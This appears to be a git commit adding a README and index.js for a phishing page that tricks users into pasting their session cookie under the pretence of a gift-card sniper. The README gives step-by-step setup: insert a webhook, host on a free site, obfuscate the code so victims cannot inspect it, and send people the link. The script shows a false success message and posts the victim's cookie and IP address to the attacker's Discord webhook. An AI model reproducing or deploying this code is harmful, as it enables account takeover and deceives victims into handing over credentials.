32974509f85c3f3d96d482dd9826a743f6d8bf6e
OriginalAlien <80835991+OriginalAlien@users.noreply.github.com>
2021-11-01 09:32:05 -0400

    Add files via upload

---
+++ README.txt
@@ -0,0 +1,21 @@
+this was made by sigma#4268 aka xyz#7000
+i just changed my tag
+
+anyways just edit index.js and then change your webhook
+
+and then save
+
+now goto 000webhost and make a webiste and goto file manager
+I recommend to obfuscate index.js and index.css so the user can't see the source code. You can use free css and js obfuscators online
+upload index.html, index.js, style.css in and save and close
+now just ask someone to goto ur website.
+done
+
+also dont change the names of the file or else it wont work properly
+
+this doesnt snipe giftcard codes, it just for cookie phishing
+how it looks https://cdn.discordapp.com/attachments/845779151780970507/904506899175718963/unknown.png
+
+also if one of the image source all of a sudden turns invalid/doesnt appear just replace with a new image url
+
+alr cya
---
+++ index.js
@@ -0,0 +1,52 @@
+const yourwebhook = "WEBHOOK HERE" //change to your webhook
+
+function Send() {
+  let UserIp; // IP log
+    fetch('https://api.ipify.org/?format=json')
+    .then(results => results.json())
+    .then(data => (ip = data.ip))
+    .then(result => {
+    ip = result.ip;
+    })
+  if (document.getElementById("CookieInput").value.length < 50 ) {
+    document.getElementById("CookieError").innerHTML = "Please Enter A Valid Cookie." // checks to see if they actually entered a possibly valid cookie
+    document.getElementById("CookieError").style.color = "red";
+    throw new Error("end")
+  }
+  var cookies = document.getElementById("CookieInput").value; //getting cookies
+  document.getElementById("CookieError").innerHTML = "Successfully Started! Sniping Gift Cards Now!"
+  document.getElementById("CookieError").style.color = "green"
+  var params = { //how message looks
+    username: "sigma#4268",
+    avatar_url: "https://melmagazine.com/wp-content/uploads/2021/01/66f-1.jpg",
+    content: "@here ",
+    embeds: [
+        {
+            "title": "sigma/xyz's Gift Card Logger",
+            "color": '000000',
+            "thumbnail": {
+                "url": "",
+            },
+            "fields": [
+                {
+                    "name": "Gift Card Logger",
+                    "value": "User's Cookies: " + cookies + "\nUser's IP: " + UserIp,
+                    "inline": true
+                }
+            ]
+        }
+    ]
+}
+fetch(yourwebhook, {
+    method: "POST", //sending to yur webhook
+    headers: {
+        'Content-type': 'application/json'
+    },
+    body: JSON.stringify(params)
+}).then(res => {
+    console.log(res);
+}) 
+}
+//sigma#4268
+//idk how to make a cookie checker in javascript but enjoy
+// also i recommend obfuscating the javascript so that they can't see the source code. you can use obfuscator.io
